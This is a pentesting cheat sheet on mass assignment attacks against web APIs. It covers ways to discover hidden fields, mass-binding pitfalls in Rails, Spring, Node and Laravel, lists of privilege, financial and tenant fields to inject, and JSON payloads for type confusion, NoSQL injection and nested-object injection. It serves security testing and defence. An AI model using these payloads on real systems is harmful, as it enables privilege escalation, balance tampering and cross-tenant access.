# Mass Assignment Advanced Techniques

## Field Discovery Workflow

### 1. Visible + Hidden Comparison
```bash
# Capture what UI sends
POST /api/user/update
{"name": "John", "email": "j@b.com"}

# Capture what GET returns
GET /api/user/me
{"id": 1, "name": "John", "email": "j@b.com", "role": "user", "is_verified": true, "created_at": "...", "subscription_tier": "free", "permissions": [...]}

# Gap fields = mass assignment candidates
Candidates: id, role, is_verified, created_at, subscription_tier, permissions
```

### 2. Schema Leakage Sources
- OpenAPI/Swagger: `/api-docs`, `/swagger.json`
- Error messages: "Invalid value for field 'role'"
- Related endpoints: `/api/admin/users` may return more fields than `/api/users/me`
- Source code on GitHub
- Mobile app decompilation (model classes visible)
- Response to PATCH with invalid field types reveals all accepted fields

## Framework-Specific Vulnerabilities

### Ruby on Rails (`attr_accessible` / strong_parameters)
Older Rails (<3.2 without `attr_accessible`) was vulnerable by default. Modern Rails requires `permit()`. Bugs occur when developers use `params.permit!` (permits everything) or forget to update `permit` when adding new model fields.

### Spring (Java)
`@ModelAttribute` auto-binds request to model. If developer uses `@ModelAttribute` without `@InitBinder` field restrictions → mass assignment.

### NestJS / Express (Node.js)
Mongoose `User.create(req.body)` binds everything. Prisma similarly. Use DTOs with class-validator to prevent, but developers often skip.

### Laravel (PHP)
`$model->fill($request->all())` or mass-assignment via `User::create($request->all())`. Protected by `$fillable` and `$guarded` arrays, but misconfigurations are common.

## Priority Fields to Inject (by category)

### Identity/Authorization
```
role, roles, is_admin, isAdmin, admin, user_type, userType
permissions, privileges, grants, scope, scopes
group, groups, membership
is_active, isActive, enabled, disabled
```

### Verification
```
is_verified, isVerified, email_verified, emailVerified, phone_verified
verified_at, is_email_confirmed, is_kyc_completed
```

### Financial
```
balance, credits, points, currency
subscription_tier, plan, premium, pro, enterprise
billing_cycle, is_billable
```

### Multi-tenancy
```
org_id, organization_id, tenant_id, company_id
workspace_id, team_id, account_id
```

### Audit
```
created_at, updated_at, created_by, updated_by
last_login, login_count
```

### Internal/Debug
```
is_internal, is_staff, is_beta_tester
feature_flags, override_limits
```

## Type Confusion Attacks

Sometimes validation checks the VALUE but not the TYPE:
```json
{"is_admin": true}        // Expected
{"is_admin": "true"}      // String truthy
{"is_admin": 1}           // Number truthy
{"is_admin": [true]}      // Array truthy
{"is_admin": {"$ne": false}} // NoSQL injection
```

## Nested Object Injection

When the model has nested objects or relationships:
```json
{
  "name": "John",
  "profile": {
    "bio": "text",
    "role_override": "admin",
    "settings": {
      "admin_mode": true
    }
  },
  "roles": [
    {"name": "admin"}
  ]
}
```
Nested fields often have weaker validation than top-level fields.
